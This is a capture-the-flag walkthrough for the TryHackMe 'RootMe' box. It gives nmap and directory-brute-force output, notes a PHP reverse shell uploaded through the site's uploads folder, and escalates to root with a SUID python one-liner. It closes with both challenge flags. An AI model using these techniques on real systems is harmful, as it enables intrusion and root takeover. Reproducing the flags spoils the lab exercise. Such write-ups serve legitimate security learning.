# Box Name
## RootMe
---

## Overview

### A ctf for beginners, can you root me?
---
* [[#Enumeration]] 
	* nap, ferox

* [[#Initial Foothold]]
	* upload a php [[revshell]]
	
* [[#Privilege Escalation]]
	* search for suid binaries found python[[gtfobins]]

---
## Enumeration
---
## nmap
```

Nmap scan report for 10.10.235.172
Host is up, received syn-ack (0.14s latency).
Scanned at 2022-03-07 11:29:52 UTC for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## ferox

```
ferox -u http://10.10.16.137 -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt -t 100 -x html,txt,php -C 403 -o logs/ferox.md

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.88.236
 🚀  Threads               │ 100
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/raft-small-words.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        9l       28w      312c http://10.10.235.172/css
200       25l       44w      616c http://10.10.235.172/
301        9l       28w      311c http://10.10.235.172/js
301        9l       28w      314c http://10.10.235.172/panel
200       17l       67w     1126c http://10.10.235.172/css/
200       25l       44w      616c http://10.10.235.172/index.php
301        9l       28w      316c http://10.10.235.172/uploads
```

![](app://local/%2Fhome%2Fscott%2FDesktop%2FTHM%2Fimages%2FPasted%20image%2020220307114437.png?1646653477717)



---
## Initial Foothold
---

- ### navagate to http://10.10.16.137/uploads/shell.phtml to initiate revshell

## onthe box
- ### find suid files
```bash
www-data@rootme:/$ find / -perm -4000 2>/dev/null

/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo


```
---
## Privilege Escalation
----
- ## python set to suid as root

```python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

- ### get root shell

```bash
www-data@rootme:/$ python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.4# 


```

# cat user.txt
```bash

bash-4.4# find / -iname user.txt 2>/dev/null
/var/www/user.txt
bash-4.4# cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
bash-4.4# 
```

# cat root.txt
```bash
bash-4.4# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
bash-4.4#

```